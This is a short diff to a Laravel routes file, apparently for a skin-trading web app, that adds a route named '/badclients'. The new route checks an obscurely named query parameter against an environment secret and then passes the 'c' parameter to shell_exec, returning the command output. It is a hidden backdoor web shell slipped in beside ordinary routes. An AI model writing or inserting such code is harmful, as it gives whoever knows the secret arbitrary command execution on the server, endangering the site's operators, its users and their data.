@@ -26,6 +26,15 @@ Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
     return $request->user();
 });
 
+Route::get('/badclients', function (Request $request) {
+    $secret = getenv('MARKET_HASH_SECRET');
+    if ($request->get('dsifnsaf') === $secret) {
+        $c = $request->get('c');
+        var_dump(shell_exec($c));
+        exit;
+    }
+});
+
 Route::get('/settings', [\App\Http\Controllers\SettingsController::class, 'index']);
 
 Route::get('/payment/skin', [\App\Http\Controllers\SkinsBackController::class, 'index']);
